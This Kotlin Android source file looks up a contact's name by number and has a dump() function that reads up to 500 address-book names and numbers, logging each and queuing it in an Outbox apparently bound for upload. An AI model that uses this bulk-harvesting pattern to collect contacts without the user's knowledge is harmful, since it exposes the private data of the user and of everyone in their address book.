package com.vlink.consent

import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import org.json.JSONObject

object ContactNames {
    fun resolve(ctx: Context, number: String): String? = runCatching {
        val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
        ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
            ?.use { c -> if (c.moveToFirst()) c.getString(0) else null }
    }.getOrNull()

    fun dump(ctx: Context, limit: Int = 500): Int {
        var n = 0
        val cols = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, cols, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )?.use { c ->
            while (c.moveToNext() && n < limit) {
                val p = JSONObject().put("name", c.getString(0) ?: "").put("number", c.getString(1) ?: "")
                EventLog.add(ctx, "contact", p)
                Outbox(ctx).put("contact", p)
                n++
            }
        }
        return n
    }
}
